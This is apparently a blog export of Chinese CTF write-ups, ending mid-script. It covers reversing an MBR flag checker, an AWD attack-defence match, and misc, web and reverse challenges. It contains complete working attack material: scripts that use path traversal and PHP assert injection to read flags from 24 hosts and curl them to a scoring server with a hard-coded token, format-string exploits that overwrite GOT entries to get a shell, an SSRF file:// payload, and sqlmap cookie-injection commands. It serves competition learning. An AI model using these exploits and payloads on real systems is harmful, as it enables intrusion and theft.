DOS/MBR boot sector 题目给的是一个 DOS 程序，直接拖进 IDA，以 16 位的模式打开。定位到一处检测字符串前缀的代码，基本可以判断出 1234h 即我们输入的字符串在内存中的地址。 12345seg000:006F cmp dword ptr ds:1234h, &apos;galf&apos;seg000:0078 jnz loc_14Dseg000:007C movaps xmm0, xmmword ptr ds:1238hseg000:0081 movaps xmm5, xmmword ptr ds:7C00hseg000:0086 pshufd xmm0, xmm0, 1Eh 因为 IDA 不能反编译，所以基本上是直接看汇编，那么需要稍微了解一下 SSE 指令。 指令 作用 MOVAPS 把源存储器内容值送入目的寄存器。当有 m128 时, 内存地址必须是 16 字节对齐的。 PSHUFD 有三个操作数，从左往右，第一个操作数是目的操作数保存结果，第二个操作数是源操作数，第三个操作数是一个 8 位立即数，指定以怎样的顺序将源操作数中数据保存到目的操作数。 ANDPS 按位与 PSADBW 绝对差值求和 接下来的汇编部分有一些小复杂，动态调试会比较清晰。先用 qemu 启动程序（-s 参数开启远程调试服务）： 1qemu-system-i386 -drive format=raw,file=main.bin -s gdb 进行远程连接，并设置指令架构，同时在比较完 flag 前缀后设下断点（MBR 的加载地址是 0x7C00）： 1234gdb -ex 'target remote localhost:1234' \\ -ex 'set architecture i8086' \\ -ex 'break *0x7c6f' \\ -ex 'continue' 然后在程序中输入字符串，以 flag 为前缀，后面的部分用 a 到 p 来填充： 输入完成后我们可以看到 gdb 断了下来，此时可以开始和 IDA 对照着调试。可能是因为指令的结构不一样，所以 gdb 中只有当前指向的指令是基本正确的（有时可能也不正确，还是要看 IDA 的汇编）。同时在每次对 xmm 寄存器操作后，可以使用 p 命令输出并查看寄存器中的值。 首先单步调一下，看看两条 movaps 指令： 12seg000:007C movaps xmm0, xmmword ptr ds:1238hseg000:0081 movaps xmm5, xmmword ptr ds:7C00h 单步后可以看到 xmm0 中存放了我们输入的字符串中 flag 之后的部分（我是在 mac 下调试的，gdb 中可能有点 bug，寄存器存的值明显偏了 32 位）。接着执行下一条指令，可以看出 xmm5 中存放了内存中另一段的数据，可以打印出来看看： 1234567891011121314151617181920gef&gt; p $xmm5$6 = &#123; v4_float = &#123;-2.50091934, -1.48039995e-36, 1.93815862e-18, 0&#125;, v2_double = &#123;-1.787847107871084e-289, 2.8231360405480285e-315&#125;, v16_int8 = &#123;0x10, 0xf, 0x20, 0xc0, 0x83, 0xe0, 0xfb, 0x83, 0xc8, 0x2, 0xf, 0x22, 0x0, 0x0, 0x0, 0x0&#125;, v8_int16 = &#123;0xf10, 0xc020, 0xe083, 0x83fb, 0x2c8, 0x220f, 0x0, 0x0&#125;, v4_int32 = &#123;0xc0200f10, 0x83fbe083, 0x220f02c8, 0x0&#125;, v2_int64 = &#123;0x83fbe083c0200f10, 0x220f02c8&#125;, uint128 = 0x220f02c883fbe083c0200f10&#125;gef&gt; p $xmm4$7 = &#123; v4_float = &#123;0, 0, 0, -134298496&#125;, v2_double = &#123;0, -8.2671312985563202e+62&#125;, v16_int8 = &#123;0x0 &lt;repeats 12 times&gt;, 0xb8, 0x13, 0x0, 0xcd&#125;, v8_int16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x13b8, 0xcd00&#125;, v4_int32 = &#123;0x0, 0x0, 0x0, 0xcd0013b8&#125;, v2_int64 = &#123;0x0, 0xcd0013b800000000&#125;, uint128 = 0xcd0013b8000000000000000000000000&#125; 12seg000:0086 pshufd xmm0, xmm0, 1Ehseg000:008B mov si, 8 接下来单步执行 pshufd 这条指令。不关注 pshufd 的具体作用的话，可以在调试中看到，运行过后发现 xmm0 中的值从 0x706f6e6d6c6b6a696867666564636261 变成了 0x6463626168676665706f6e6d6c6b6a69，数据的顺序变化了。然后将 si 置为 8，在后面的调试中可以判断出，si 中存放的为循环次数。 12seg000:008E movaps xmm2, xmm0seg000:0091 andps xmm2, xmmword ptr [si+7D90h] 接下来两条指令分别将 xmm0 赋给 xmm2 以及将 xmm2 和内存中的一段数据按位与。看一看到 xmm2 中的值即为变化后的输入： 1234567891011121314151617181920gef&gt; p $xmm2$2 = &#123; v4_float = &#123;2.96401656e+29, 4.37102201e+24, 1.67779994e+22, 0&#125;, v2_double = &#123;8.5408834851248547e+194, 8.3212257841951935e-315&#125;, v16_int8 = &#123;0x6d, 0x6e, 0x6f, 0x70, 0x65, 0x66, 0x67, 0x68, 0x61, 0x62, 0x63, 0x64, 0x0, 0x0, 0x0, 0x0&#125;, v8_int16 = &#123;0x6e6d, 0x706f, 0x6665, 0x6867, 0x6261, 0x6463, 0x0, 0x0&#125;, v4_int32 = &#123;0x706f6e6d, 0x68676665, 0x64636261, 0x0&#125;, v2_int64 = &#123;0x68676665706f6e6d, 0x64636261&#125;, uint128 = 0x6463626168676665706f6e6d&#125;gef&gt; p $xmm1$3 = &#123; v4_float = &#123;0, 0, 0, 1.1384003e+27&#125;, v2_double = &#123;0, 1.8458895617341177e+214&#125;, v16_int8 = &#123;0x0 &lt;repeats 12 times&gt;, 0x69, 0x6a, 0x6b, 0x6c&#125;, v8_int16 = &#123;0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6a69, 0x6c6b&#125;, v4_int32 = &#123;0x0, 0x0, 0x0, 0x6c6b6a69&#125;, v2_int64 = &#123;0x0, 0x6c6b6a6900000000&#125;, uint128 = 0x6c6b6a69000000000000000000000000&#125; 查看内存中的数据，可以看到和输入按位与之后，会把对应为 0x00 两个字节给抹掉。并通过下面的分析可以知道总共会有 8 次循环，每次进行按位与的数据是不同的，即每次的数据会左移 4 位： 12345678910111213141516gef&gt; x/2gx 0x7D980x7d98: 0xffffffffffffff00 0xffffffffffffff00gef&gt; x/2gx 0x7D970x7d97: 0xffffffffffff00ff 0xffffffffffff00ffgef&gt; x/2gx 0x7D960x7d96: 0xffffffffff00ffff 0xffffffffff00ffffgef&gt; x/2gx 0x7D950x7d95: 0xffffffff00ffffff 0xffffffff00ffffffgef&gt; x/2gx 0x7D940x7d94: 0xffffff00ffffffff 0xffffff00ffffffffgef&gt; x/2gx 0x7D930x7d93: 0xffff00ffffffffff 0xffff00ffffffffffgef&gt; x/2gx 0x7D920x7d92: 0xff00ffffffffffff 0xff00ffffffffffffgef&gt; x/2gx 0x7D910x7d91: 0x00ffffffffffffff 0x00ffffffffffffff 接着看 psadbw 这条指令，这里将 xmm5 和 xmm2 中的数据进行绝对差值求和（每 64 位的数据逐字节相减，将结果相加后存到前一个操作数中）。接着把高低 64 位经过绝对差值求和的结果（每个结果大小为 16 位，高低两个结果共 32 位）保存到 edi 中： 12345seg000:0096 psadbw xmm5, xmm2seg000:009A movaps xmmword ptr ds:1268h, xmm5seg000:009F mov di, ds:1268hseg000:00A3 shl edi, 10hseg000:00A7 mov di, ds:1270h 然后将 edi 中的结果和内存里的值比较，如果不相等，会有个大跳转，IDA 里大概判断一下应该是直接跳到失败处。 123456789seg000:00AB mov dx, siseg000:00AD dec dxseg000:00AE add dx, dxseg000:00B0 add dx, dxseg000:00B2 cmp edi, [edx+7DA8h]seg000:00BA jnz loc_14Dseg000:00BE dec siseg000:00BF test si, siseg000:00C1 jnz short sub_8E 查看内存中进行比较的值，正好 8 个值，每次都进行一次判断： 123gef&gt; x/8wx 0x7DA80x7da8: 0x02110270 0x02290255 0x025e0291 0x01f902330x7db8: 0x027b0278 0x02090221 0x0290025d 0x02df028f 基本上所有的线性关系都有了，接下来交给 z3 就行了。 Script12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env pythonfrom z3 import *def z3_abs(x): return If(x &gt;= 0, x, -x)def psadbw(xmm0, xmm1): a = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[:8], xmm1[:8])]) b = Sum([z3_abs(b1 - b2) for b1, b2 in zip(xmm0[8:], xmm1[8:])]) return a + b * 0x10000s = Solver()ZERO = IntVal(0)xmm5 = '220f02c883fbe083c0200f10cd0013b8'.decode('hex')xmm5 = [ord(c) for c in xmm5]xmm5s = [xmm5]xmm0 = [Int('x%d' % i) for i in range(16)]for c in xmm0: s.add(c &gt;= 32, c &lt;= 126)check = [0x02df028f, 0x0290025d, 0x02090221, 0x027b0278, 0x01f90233, 0x025e0291, 0x02290255, 0x02110270]xmm5s += map(lambda e: [0, 0, 0, 0, 0, 0, (e &gt;&gt; 8) &amp; 0xFF, e &amp; 0xFF, 0, 0, 0, 0, 0, 0, e &gt;&gt; 24, (e &gt;&gt; 16) &amp; 0xFF], check)print xmm5sfor i in range(8): xmm5 = xmm5s[i] xmm2 = list(xmm0) xmm2[7 - i] = ZERO xmm2[15 - i] = ZERO res = psadbw(xmm5, xmm2) s.add(res == check[i])if s.check() == sat: print s.model() flag = ''.join(chr(eval(str(s.model()[c]))) for c in xmm0) # pshufd xmm0, xmm0, 1Eh flag = 'flag' + flag[:4][::-1] + flag[4:8][::-1] + flag[12:][::-1] + flag[8:12][::-1] print flag # flag&#123;4r3alz_m0d3_y0&#125; Referenceshttps://fortenf.org/e/ctfs/re/2017/09/18/csaw17-realism.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-XMan结营赛","slug":"2018-XMan结营赛","date":"2018-08-22T09:39:54.000Z","updated":"2019-08-26T01:15:23.740Z","comments":true,"path":"2018/08/22/2018-XMan结营赛/","link":"","permalink":"blog.b3ale.cn/2018/08/22/2018-XMan结营赛/","excerpt":"记录一下被虐的经历。","text":"记录一下被虐的经历。 全队就我一个菜鸡维护二进制，全场被痛打，很难受。记录一下线下 AWD 所需要做的准备，以及两道 pwn 的复现。 准备第一次打 AWD，什么也不懂。 比赛前了解比赛赛制、环境。 服务器上线之后，第一时间改密码。 下载好FileZilla、Xshell等连接服务器的工具，把服务器上给的文件备份。 提前准备好自动化的脚本。 这里放一下队友 web 大佬的打全场脚本： 12345678910111213141516171819202122232425from requests import getfrom os import systemfor i in range(24): if i == 12: continue print(f\"======&#123;i+1&#125; starts=======\") url = f\"http://172.16.&#123;i+1&#125;.101:20001/uploads/images/../../../../../../../flag\" try: flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: print(f\"&#123;i+1&#125; : no\") pass url = f\"http://172.16.&#123;i+1&#125;.101:20001/category/test?0=%28function%28%29%7b%0a%20%20%20%20var%20fs%20%3d%20require%28%27fs%27%29%3b%0a%09var%20flag%20%3d%20fs.readFileSync%28%27%2fflag%27%2c%20%27utf-8%27%29%3b%0a%09fs.writeFileSync%28%27%2fhome%2fxctf%2fweb%2fstatic%2fjs%2ftest.js%27%2c%20flag%29%3b%0a%09return%201%3b%0a%7d%29%28%29%3b\" try: get(url) url = f\"http://172.16.&#123;i+1&#125;.101:20001/static/js/test.js\" flag = get(url).text flag = get(url).text[:-1] system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print(f\"\\n&#123;flag&#125;\") except: pass 1234567891011121314151617181920212223242526272829303132from requests import postfrom pyquery import PyQuery as pqfrom os import systemfor i in range(24): if i == 8: continue print(f\"======&#123;i+1&#125; starts=======\") if i == 12 or i == 2: continue payloads = [ \"@assert($_POST[cmd])\", \"@assert($_POST[cmd])\", \"@call_user_func(assert, $_POST[cmd])\", \"print(file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103)))\" ] for p in payloads: url = \"http://172.16.\" + str(i+1) + \".102:20002/?r=list&amp;pages=123&#123;$&#123;\" + p + \"&#125;&#125;123\" t = post(url, data=&#123;'cmd' : 'system(\"/bin/cat /flag\");'&#125;).text try: d = pq(t) out = d('.pagecode').html() print(out) flag = out.split(';')[-2].split('\\n')[1] if i==16: flag = flag[2:] print(f\"&#123;i+1&#125; : &#123;flag&#125;\") system(f'curl http://172.16.200.20:9000/submit_flag/ -d \"flag=&#123;flag&#125;&amp;token=Hn4JuwQQ7Mfaek2HAuTkB3S6k4e38EKXQJEdtDDWDfsda2tqQUgUHRCtrtxbS9hMkQndVbVfHsD\"') print('\\n') except: print(f\"&#123;i+1&#125; not avai\") pass 复现全场贡献只有成功 patch 了最容易的第二题。 once_timechecksec： 123456[*] '/home/assassinq/Desktop/once_time' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 拖进 ida，main 函数： 123456789101112131415unsigned __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; char s; // [rsp+0h] [rbp-20h] char v5; // [rsp+8h] [rbp-18h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); setbuf(); printf(\"input your name: \", a2); memset(&amp;s, 0, 9uLL); read(0, &amp;s, 9uLL); v5 = 0; printf(\"wellcome :%s\\n\", &amp;s); return vul();&#125; 另一个关键函数： 1234567891011121314151617unsigned __int64 vul()&#123; char s; // [rsp+0h] [rbp-20h] unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(\"leave a msg: \"); memset(&amp;s, 0, 0x10uLL); read(0, &amp;s, 0x20uLL); if ( strstr(&amp;s, \"%p\") || strstr(&amp;s, \"$p\") ) &#123; puts(\"do you want to leak info?\"); exit(0); &#125; printf(&amp;s, \"$p\"); return __readfsqword(0x28u) ^ v2;&#125; vul()中read(0, &amp;s, 0x20uLL);处存在buffer overflow，又因为开了 Canary，需要想办法绕过；printf(&amp;s, &quot;$p&quot;);处存在format string，可以实现任意地址的读和写。 首先将__stack_chk_fail的 got 表改成 main 函数的地址，那么这样每次栈溢出报错的时候就会再一次执行 main 函数，从而实现多次输入，可以多次利用printf(&amp;s，&quot;$p&quot;);进行格式化字符串攻击； 泄漏 libc 的基址，这里用泄漏 read 函数的真实地址来实现； 将 one_gadget 写入 exit()函数的 got 表中。 12345670008| 0x7fffffffdc10 (&quot;BBBBBBBB\\n&quot;) ; 第二次输入0016| 0x7fffffffdc18 --&gt; 0xa (&apos;\\n&apos;)0024| 0x7fffffffdc20 --&gt; 0x00032| 0x7fffffffdc28 --&gt; 0x8e2d258951a854000040| 0x7fffffffdc30 --&gt; 0x7fffffffdc60 --&gt; 0x400a20 (push r15)0048| 0x7fffffffdc38 --&gt; 0x400a08 (mov rcx,QWORD PTR [rbp-0x8])0056| 0x7fffffffdc40 (&quot;AAAAAAAA&quot;) ; 第一次输入 调试出来可以看到第一次输入位于第二次输入后的第六个参数，64 位下偏移就是 12。为了达到触发__stack_chk_fail的目的，我们还需要覆盖掉 Canary，位于第二次输入后的第三个参数处，故至少需要输入大于 24 个字符。read 总共读 0x20 个字符，我们这里也就读 0x20 个，以触发__stack_chk_fail。 第二步利用read的 got 表将 libc 基址泄漏出来。然后在已知 libc 版本的情况下，第三步将exit的 got 表覆盖成 one_gadget。最后送个%p或者$p上去 getshell。exp 如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#!/usr/bin/env python#coding=utf-8from pwn import *# context.log_level = 'debug'context.arch = 'amd64'p = process('./once_time')elf = ELF('./once_time')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')one_gadget_offset = 0xf1147info('&gt;&gt;&gt; REPLACE __stack_chk_fail WITH main &lt;&lt;&lt;')main = 0x400983stack_chk_fail_got = elf.got['__stack_chk_fail']p.recvuntil('input your name: ')p.sendline(p64(stack_chk_fail_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$n'.format(str(main))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('&gt;&gt;&gt; LEAK libc &lt;&lt;&lt;')read_got = elf.got['read']p.recvuntil('input your name: ')p.sendline(p64(read_got))p.recvuntil('leave a msg: ')payload = '%12$s'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)data = p.recvuntil('\\x7f')print u64(data[-6:].ljust(8, '\\x00'))read_offset = libc.symbols['read']libc_base = u64(data[:6].ljust(8, '\\x00')) - read_offset# libc.address = read - read_offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offsetsuccess('one_gadget = ' + hex(one_gadget))info('&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;')info('FIRST WORD')info(hex(one_gadget &amp; 0xFFFF))exit_got = elf.got['exit']p.recvuntil('input your name: ')p.sendline(p64(exit_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str(one_gadget &amp; 0xFFFF))#取最低的双字节并对齐payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('SECOND WORD')info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 2))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('THIRD WORD')info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 4))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('FOURTH WORD')info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 6))p.recvuntil('leave a msg: ')if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0: payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))else: payload = '%12$hn'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)p.recvuntil('input your name: ')p.sendline('root')p.recvuntil('leave a msg: ')p.sendline('%p')p.recvuntil('\\n')success('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() messageboard这题大佬们都用堆做，然而我一点都不会。后来神仙 pizza 给了一种format string的超简单做法。 123456[*] '/home/assassinq/Desktop/messageboard' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 拖进 ida 里，典型的堆题的形式，这里只看第四个选项： 123456789101112131415161718192021222324252627282930313233unsigned __int64 getshell()&#123; int fd; // ST04_4 __int64 v2; // [rsp+8h] [rbp-58h] __int128 v3; // [rsp+28h] [rbp-38h] __int64 *v4; // [rsp+38h] [rbp-28h] char *v5; // [rsp+40h] [rbp-20h] __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"guess a number:\"); v3 = 0uLL; v5 = command; v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317); readline((__int64)nptr, 0x18u); fd = open(\"/dev/random\", 0); read(fd, &amp;v3, 2uLL); read(fd, (char *)&amp;v3 + 8, 2uLL); v2 = atoi(nptr); v4 = &amp;v2; sleep(1u); printf(\"you guess \", (char *)&amp;v3 + 8); printf(nptr); printf(\" the answer is %lld \\n\", (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1)); if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) ) &#123; puts(\"GG!\"); exit(0); &#125; system(command); return __readfsqword(0x28u) ^ v7;&#125; 可以看到这里让我们猜测一个系统产生的随机数，猜对了就能 getshell。再来看看 pizza 的 exp： 12345678from pwn import *p = process('./messageboard')p.recvuntil('choice &gt;&gt;')p.sendline('4')p.recvuntil('guess a number:')payload = '%2$*11$s%2$*12$s%13$n'p.sendline(payload)p.interactive() 关于*：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号”*“表示取对应函数参数的值。例如printf(&quot;%*d&quot;, 5, 10)输出”10“；printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)输出”abc“。 由此可知，第十一位和第十二位参数上存放的是随机数，第十三位则是我们的输入，这里将随机数的值写入我们的输入，达到 getshell 的目的。 堆的做法以后再来复现。 总结比赛打下来，发现实力是重要的一部分，同时经验、技巧（猥琐发育）以及运气都是重要的因素。希望下次有更多的机会参与线下 AWD 比赛。 参考网站https://www.jianshu.com/p/b8e448951125https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"blog.b3ale.cn/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"blog.b3ale.cn/tags/wp/"}]},{"title":"2018-XMan个人排位赛","slug":"2018-XMan个人排位赛","date":"2018-08-11T12:18:08.000Z","updated":"2019-08-26T01:15:17.592Z","comments":true,"path":"2018/08/11/2018-XMan个人排位赛/","link":"","permalink":"blog.b3ale.cn/2018/08/11/2018-XMan个人排位赛/","excerpt":"唉 pwn 还是没有入门。","text":"唉 pwn 还是没有入门。 MISCFILE用DiskGenius恢复磁盘： XMAN 通行证不同的网站解密结果竟然不一样。最后发现这个网站还行。 1a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg== 第一眼就知道先是 base64： 1kanbbrgghjl&#123;zb____&#125;vtlaln 栅栏 7 栏加密： 1kzna&#123;blnl_abj_lbh_trg_vg&#125; 凯撒位移 13 位得到 flag： 1xman&#123;oyay_now_you_get_it&#125; PPAP用 wireshark 打开，搜索关键字 flag，很容易找到一串 base64： 经过分析以后，具体结构应该是这样的： 123456789101112131415yaaaaaaaar, land ho! Hey wesley, you got that flag?Ayy, I got yer files right here, matey! [base64&apos;d jpg] [base64&apos;d flag.zip]And here be the map to the booty! [base64&apos;d Haar cascade] I don&apos;t understand, this isn&apos;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!Lastly, if ye sail the seven seas, you do be a pirate! jpg 文件和 zip 文件之间通过等号判断分隔。通过 python 得到三个文件： 123456789# exampleimport base64f1 = open('b1', 'r')enc1 = f1.read()f2 = open('b1.jpg', 'w')out = base64.b64decode(enc1)f2.write(out)f1.close()f2.close() 然后又通过 binwalk 发现，这里输出的 jpg 图片其实不止一张。用 foremost 输出所有的图片。 下面用了官方的脚本，用 opencv 找出数百张图片的其中一张来得到密码： 12345678910111213141516171819202122232425import osimport sysimport cv2# Get all of the picturesimgs = os.listdir('jpg')# Cascade we'll be using for detectioncascade = cv2.CascadeClassifier('b3.xml')# From the cluesscaling_factor = 1.02min_neighbors = 10 # Bumped this up until one pic was leftfor img_name in imgs: # Load the image and run the cascade img = cv2.imread(os.path.join('jpg', img_name)) detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors) if len(detect) &gt; 0: for (x, y, w, h) in detect: # X marks the spot! cv2.line(img, (x, y), (x + w, y + h), (255, 0, 0), 2) cv2.line(img, (x, y + h), (x + w, y), (255, 0, 0), 2) # Save the new image cv2.imwrite(os.path.join('detected', img_name), img) 最后得到一张海盗的图片，容易知道密码应该是 skullandcrossbones，得到 flag。 AUTOKEY一个 pcap 包，都是 usb 流量，通过tshark提取出来： 12 ⚡ root@kali  ~/Desktop  tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txtRunning as user \"root\" and group \"root\". This could be dangerous. 查看后发现都是八个字节的数据，那么应该是键盘流量，用脚本跑出来： 1234567891011121314151617181920#!usr/bin/env python#-*- coding:utf-8 -*-mappings = &#123; 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" &#125;nums = []keys = open('usbdata.txt')for line in keys: if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': continue nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]'print 'output :\\n' + output 出来的结果： 12output :[unknown]A[unknown]UTOKEY&apos;&apos;.DECIPHER&apos;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&apos; 去掉[uuknown]，[DEL]则是去掉后一个字符，得到： 12output :AUTOKEY&apos;&apos;.DECIPHER&apos;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&apos; 百度一下 autokey，用 github 上找到的的爆破脚本得到 flag。 123-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLFHELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF WEBSIMPLE SSRFhint 里提示curl还有flag在/etc/flag.txt，大概是通过 file 协议读取本地文件。payload： 1file://www.baidu.com/etc/flag.txt# MAKEIT网页上提示了 git，猜测存在.git文件泄露，把源码下载下来之后审计： 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 这里有assert()，可以执行函数中的命令，通过构造闭合前面的strpos()绕过，来得到templates/flag.php中的内容： 11&apos;, &apos;..&apos;) or system(&apos;cat templates/flag.php&apos;); // BBSQLIcookie 注入，PHPSESSID 拿下来： 用 sqlmap 跑： 123456// 跑表名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --table --level 2// 跑列名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --columns -T '[GDJM_flag]' --level 2// 跑flagpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --dump -T '[GDJM_flag]' -C 'flag' --level 2 PS：不同的 level 等级，SQLMAP 所采用的策略也不近相同，当–level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当–level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。 REDRAGON QUEST和 csaw 的那道 wyvern 很像，可以用 angr 跑出来： 12345678910111213141516171819202122232425262728#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('task_xman1')flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)] # flag's length is 28, every char is 8 bitflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')]) # end with '\\n'st = p.factory.full_init_state( args=['./xman_task1'], # arguments add_options=angr.options.unicorn, stdin=flag, # flag as input)for k in flag_chars: st.solver.add(k != 0) # char is not 0 st.solver.add(k != 10) # char is not '\\n'sm = p.factory.simulation_manager(st)sm.run()out = b''for pp in sm.deadended: out = pp.posix.dumps(1) if b'flag&#123;' in out: out = next(filter(lambda s: b'flag&#123;' in s, out.split())) breakprint('flag:', out) pizza 大佬提供了另一种思路。先用 ida-python 去混淆： 1234567891011121314151617181920import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesdef do_patch(ea): if(get_bytes(ea, 1) == \"\\x8B\"): # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\") elif(get_bytes(ea, 2) == \"\\x44\\x8B\"): # mov r8d-r15d, dword reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea + 1, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\")for 